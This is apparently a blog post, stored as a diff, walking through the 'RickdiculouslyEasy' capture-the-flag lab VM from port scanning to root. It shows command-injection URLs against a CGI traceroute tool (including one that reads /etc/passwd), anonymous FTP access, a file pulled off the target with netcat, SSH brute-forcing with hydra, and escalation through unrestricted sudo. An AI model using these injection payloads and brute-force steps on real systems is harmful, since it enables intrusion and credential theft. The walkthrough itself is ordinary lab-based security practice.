@@ -1,0 +1,316 @@
+I"sR<p>This is a machine created by <strong>Luke</strong>, the goal of this is to capture the flags and obtain 130 points, also get root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We start by discovering the target on the local machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1-255
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-18 19:53 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.1
+Host is up.
+Nmap scan report <span class="k">for </span>192.168.179.148
+Host is up <span class="o">(</span>0.00074s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 08:00:27:7B:BF:F3 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.254
+Host is up <span class="o">(</span>0.00018s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:50:56:E2:97:73 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap <span class="k">done</span>: 255 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.01 seconds
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Found our target and then we proceed to perform a full TCP port scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-T5</span> <span class="nt">-p1-65535</span> 192.168.179.148 <span class="nt">-oG</span> tcp-all-ports.txt
+...
+PORT      STATE SERVICE    REASON
+21/tcp    open  ftp        syn-ack ttl 64
+22/tcp    open  ssh        syn-ack ttl 64
+80/tcp    open  http       syn-ack ttl 64
+9090/tcp  open  zeus-admin syn-ack ttl 64
+13337/tcp open  unknown    syn-ack ttl 64
+22222/tcp open  easyengine syn-ack ttl 64
+60000/tcp open  unknown    syn-ack ttl 64
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Then I perform the version and OS detection and script scanning for open TCP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p21</span>,22,80,9090,13337,22222,60000 192.168.179.148 <span class="nt">-oN</span> service-enum.txt
+...
+PORT      STATE SERVICE REASON         VERSION
+21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| <span class="nt">-rw-r--r--</span>    1 0        0              42 Aug 22  2017 FLAG.txt
+|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.179.1
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh?    syn-ack ttl 64
+| fingerprint-strings:
+|   NULL:
+|_    Welcome to Ubuntu 14.04.5 LTS <span class="o">(</span>GNU/Linux 4.4.0-31-generic x86_64<span class="o">)</span>
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.27 <span class="o">((</span>Fedora<span class="o">))</span>
+| http-methods:
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.27 <span class="o">(</span>Fedora<span class="o">)</span>
+|_http-title: Morty<span class="s1">'s Website
+9090/tcp  open  http    syn-ack ttl 64 Cockpit web service 161 or earlier
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-title: Did not follow redirect to https://192.168.179.148:9090/
+13337/tcp open  unknown syn-ack ttl 64
+| fingerprint-strings:
+|   NULL:
+|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
+22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNvEvp4kqXX1H6FNqkKASBizY59uyLsqrLzLfT4R5vD8yuq+K0OqomxTiDwipMZTfQIRuBl2OzXX3rzRQ0aB+4EXyLbsxqNNP/+xRgPgFL6FPNI7j2rPGt+hQ6nmkpBJzzSpA4BBlGwvQt/i4LhrRoDsuD2JxQlmH1LNAlG6rE+xyqMTEgnfnO70pYzcmxDOixHiqTkbrsGnE6kIiyiOopwsR2E2KLPusFQJhEhsOOCJzurO7YYbDxQIwOMOox96SPtgti+4bnAVndLpo/IddtzZu3PB4SK43aIeGWgP7ONl6H0Cs1opW1EQSmdpww+Nu3fMlAlC+VMfmJNca8z9Np
+|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKqM0Vcrgqds3NsV5wJ7j876UEKSpMytY6gNpa0Ey47sSAizc+hUU8UGoFmPsco2rjIn9QhdEIWzeMJksnpbxDk=
+|   256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJ5AJGj4+y9xHabmQ5cLyxySqPvQ9sW+ko0w1vnzZWI
+60000/tcp open  unknown syn-ack ttl 64
+|_drda-info: ERROR
+| fingerprint-strings:
+|   NULL, ibm-db2:
+|_    Welcome to Ricks half baked reverse shell...
+</span></code></pre></div></div>
+<p>If we notice in the results we can see an unusual banner on port 13337, the value of our first flag 10pts.</p>
+
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<p>The anonymous login is enabled for the FTP service, so I create a mount point on my machine and we have the second flag of 10pts, for the moment we have 20pts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span><span class="nb">mkdir</span> /mnt/ftp
+root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>curlftpfs ftp://anonymous:@192.168.179.148 /mnt/ftp
+root@kali:~/rickdiculouslyeasy<span class="nv">$ </span><span class="nb">cd</span> /mnt/ftp
+root@kali:/mnt/ftp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> <span class="k">*</span>
+<span class="nt">-rw-r--r--</span> 1 root root 42 Aug 22  2017 FLAG.txt
+
+pub:
+total 4
+drwxr-xr-x 2 root root    6 Feb 12  2017 <span class="nb">.</span>
+drwxr-xr-x 1 root root 1024 Dec 31  1969 ..
+root@kali:/mnt/ftp<span class="nv">$ </span><span class="nb">cat </span>FLAG.txt 
+FLAG<span class="o">{</span>Whoa this is unexpected<span class="o">}</span> - 10 Points
+</code></pre></div></div>
+
+<h3 id="web-enumeration-on-por-80">Web Enumeration on por 80</h3>
+<p>In the web service at first glance I can’t find anything, so I request for the robots.txt file.</p>
+
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/robots.txt
+</code></pre></div></div>
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-2.png" alt="" /></p>
+
+<p>In the tracertool.cgi file, I found a traceroute utility, it looks interesting.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi
+</code></pre></div></div>
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-3.png" alt="" /></p>
+
+<p>I try to add the <strong>id</strong> command after of the loopback ip address followed by a semicolon and the command is executed, apparently the user input is not validating correctly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span>127.0.0.1<span class="p">;</span><span class="nb">id</span>
+</code></pre></div></div>
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-4.png" alt="" /></p>
+
+<p>Then I try to list a path back and found the html directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span><span class="p">;</span><span class="nb">ls</span> <span class="nt">-la</span> ../
+</code></pre></div></div>
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-5.png" alt="" /></p>
+
+<p>I list the html directory and I find a passwords file, access it and I found the flag.txt and passwords.html files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span><span class="p">;</span><span class="nb">ls</span> <span class="nt">-la</span> ../html
+</code></pre></div></div>
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-6.png" alt="" /></p>
+
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-7.png" alt="" /></p>
+
+<p>We have the third 10pts flag that adds up to 30pts.</p>
+
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-8.png" alt="" /></p>
+
+<p>In the passwords.html file I found the <strong>winter</strong> password.</p>
+
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-9.png" alt="" /></p>
+
+<p>Now we have the password but don’t know the system users to access via ssh, trying to display the content of the passwd file with the cat command, this doesn’t work to avoid this problem I used the less command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span><span class="p">;</span>less /etc/passwd
+</code></pre></div></div>
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-10.png" alt="" /></p>
+
+<h3 id="enumeration-on-port-60000">Enumeration on port 60000</h3>
+<p>On this port we connect with netcat, but this is a rabbit hole, the only one I could find is the 10pts flag that adds up to 40pts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>nc 192.168.179.148 60000
+Welcome to Ricks half baked reverse shell...
+<span class="c"># whoami</span>
+root 
+<span class="c"># id</span>
+<span class="nb">id</span>: <span class="nb">command </span>not found 
+<span class="c"># ls</span>
+FLAG.txt 
+<span class="c"># pwd </span>
+/root/blackhole/ 
+<span class="c"># cd ..</span>
+Permission Denied. 
+<span class="c"># cd /tmp</span>
+Permission Denied. 
+<span class="c"># cat FLAG.txt</span>
+FLAG<span class="o">{</span>Flip the pickle Morty!<span class="o">}</span> - 10 Points 
+<span class="c"># </span>
+</code></pre></div></div>
+
+<h3 id="enumeration-on-port-9090">Enumeration on port 9090</h3>
+<p>On this port I found another 10pts flag that adds up to 50pts.</p>
+
+<p><img src="/assets/images/rickdiculouslyeasy/screenshot-11.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+<p>I logged via ssh with the user <strong>Summer</strong> and password <strong>winter</strong>, and in her home directory I found the 10pts flag, this adds up to 60pts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>ssh Summer@192.168.179.148 <span class="nt">-p</span> 22222
+Summer@192.168.179.148<span class="s1">'s password: 
+Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
+[Summer@localhost ~]$ id
+uid=1002(Summer) gid=1002(Summer) groups=1002(Summer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[Summer@localhost ~]$ ls
+FLAG.txt
+[Summer@localhost ~]$ less FLAG.txt 
+FLAG{Get off the high road Summer!} - 10 Points
+</span></code></pre></div></div>
+
+<p>In the Morty’s home directory I found an image and a zip file, downloaded via scp.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>scp <span class="nt">-P</span> 22222 Summer@192.168.179.148:<span class="s2">"/home/Morty/{journal.txt.zip,Safe_Password.jpg}"</span> <span class="nb">.</span>
+Summer@192.168.179.148<span class="s1">'s password: 
+journal.txt.zip                                                                           100%  414    29.4KB/s   00:00
+Safe_Password.jpg                                                                         100%   42KB   1.1MB/s   00:00
+</span></code></pre></div></div>
+
+<p>Analyzing the image with the strings command I found the <strong>Meeseek</strong> password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>strings Safe_Password.jpg | <span class="nb">head</span> <span class="nt">-5</span>
+JFIF
+Exif
+8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+8BIM
+8BIM
+</code></pre></div></div>
+
+<p>Then I unzip the <strong>journal.txt.zip</strong> file with the password found, in the text we see something about a password for safe, and the 20pts flag, this adds up to 80pts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>unzip journal.txt.zip              
+Archive:  journal.txt.zip
+<span class="o">[</span>journal.txt.zip] journal.txt password: 
+  inflating: journal.txt
+  root@kali:~/rickdiculouslyeasy<span class="nv">$ </span><span class="nb">cat </span>journal.txt
+Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: <span class="o">{</span>131333<span class="o">}</span> - 20 Points
+</code></pre></div></div>
+
+<p>Inside the path <strong>/home/RickSanchez/RickSanchez/RICKS_SAFE/</strong>, I found a binary called safe.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Summer@localhost home]<span class="nv">$ </span><span class="nb">cd </span>RickSanchez/RickSanchez/RICKS_SAFE/
+<span class="o">[</span>Summer@localhost RICKS_SAFE]<span class="nv">$ </span><span class="nb">ls
+</span>safe
+</code></pre></div></div>
+
+<p>I transfer this to the attacking machine, I give execution permissions to the safe binary, and to execute it assign the password <strong>131333</strong> as parameter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Summer@localhost RICKS_SAFE]<span class="nv">$ </span>nc <span class="nt">-vln</span> 3232 &lt; safe 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>nc 192.168.179.148 3232 <span class="o">&gt;</span> safe
+root@kali:~/rickdiculouslyeasy<span class="nv">$ </span><span class="nb">chmod </span>755 safe
+root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>./safe 131333
+decrypt:        FLAG<span class="o">{</span>And Awwwaaaaayyyy we Go!<span class="o">}</span> - 20 Points
+
+Ricks password hints:
+ <span class="o">(</span>This is incase I forget.. I just hope I don<span class="s1">'t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+Follow these clues, in order
+
+
+1 uppercase character
+1 digit
+One of the words in my old bands name.  @
+</span></code></pre></div></div>
+<p>In the results we can see the 20pts flag that adds up to 100pts, and the specifications to generate the password for the Rick user, searching in google I found the band <strong><a href="https://rickandmorty.fandom.com/wiki/The_Flesh_Curtains">The Flesh Curtains</a></strong> to wich Rick belonged, I developed a simple bash script to generate the possible passwords, and execute it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">band</span><span class="o">=</span><span class="s1">'The Flesh Curtains'</span>
+
+<span class="k">for </span>l <span class="k">in</span> <span class="o">{</span>A..Z<span class="o">}</span><span class="p">;</span> <span class="k">do
+        for </span>n <span class="k">in</span> <span class="o">{</span>0..9<span class="o">}</span><span class="p">;</span> <span class="k">do
+           for </span>w <span class="k">in</span> <span class="nv">$band</span><span class="p">;</span> <span class="k">do
+                   </span><span class="nb">echo</span> <span class="nv">$l$n$w</span>
+           <span class="k">done
+        done
+done</span> <span class="o">&gt;</span> wordlist.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>./dictgen.sh 
+</code></pre></div></div>
+
+<p>Then I ran hydra to perform brute force with the generated wordlist.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>hydra <span class="nt">-l</span> RickSanchez <span class="nt">-P</span> wordlist.txt ssh://192.168.179.148:22222
+..
+<span class="o">[</span>22222][ssh] host: 192.168.179.148   login: RickSanchez   password: P7Curtains
+</code></pre></div></div>
+
+<p>Now we have the RickSanchez password and I loggin via ssh.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/rickdiculouslyeasy<span class="nv">$ </span>ssh <span class="nt">-l</span> RickSanchez 192.168.179.148 <span class="nt">-p</span> 22222
+RickSanchez@192.168.179.148<span class="s1">'s password:
+[RickSanchez@localhost ~]$ id
+uid=1000(RickSanchez) gid=1000(RickSanchez) groups=1000(RickSanchez),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</span></code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-rights">Sudo Rights</h3>
+<p>Checking the sudo permissions this user is allowed to execute any command with those rights, so I execute the following instruction and we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>RickSanchez@localhost ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>RickSanchez: 
+Matching Defaults entries <span class="k">for </span>RickSanchez on localhost:
+    <span class="o">!</span>visiblepw, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME
+    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User RickSanchez may run the following commands on localhost:
+    <span class="o">(</span>ALL<span class="o">)</span> ALL
+<span class="o">[</span>RickSanchez@localhost ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-s</span>
+<span class="o">[</span>root@localhost RickSanchez]# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+<span class="o">[</span>root@localhost RickSanchez]# <span class="nb">cd</span>
+<span class="o">[</span>root@localhost ~]# <span class="nb">ls
+</span>anaconda-ks.cfg  FLAG.txt
+<span class="o">[</span>root@localhost ~]# CATONALEASH FLAG.txt 
+FLAG: <span class="o">{</span>Ionic Defibrillator<span class="o">}</span> - 30 points
+</code></pre></div></div>
+<p>In the /root directory I found the last 30pts flag that adds up to 130pts completing our goal.</p>
+
+:ET
